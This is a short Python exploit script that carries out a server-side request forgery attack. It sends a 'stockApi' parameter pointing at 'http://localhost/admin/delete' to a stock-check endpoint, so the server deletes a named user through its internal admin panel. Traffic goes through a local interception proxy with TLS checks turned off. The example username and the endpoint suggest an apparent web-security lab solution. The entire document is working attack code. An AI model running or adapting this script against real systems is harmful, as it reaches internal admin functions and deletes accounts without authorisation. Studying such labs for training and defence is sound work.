import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def delete_user(url, username):
    delete_user_url_ssrf_payload = f"http://localhost/admin/delete?username={username}"
    check_stock_path = "/product/stock"
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)

    # Check if user was deleted
    admin_ssrf_payload = "http://localhost/admin"
    params = {'stockApi': admin_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
    if 'User deleted successfully' in r.text:
        print("User deleted successfully")
    else:
        print("Error deleting user")


def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> username" % sys.argv[0])
        print("(+) Example: %s https://www.google.com wiener" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    username = sys.argv[2]
    print("Deleting Selected User......")
    delete_user(url, username)


if __name__ == "__main__":
    main()
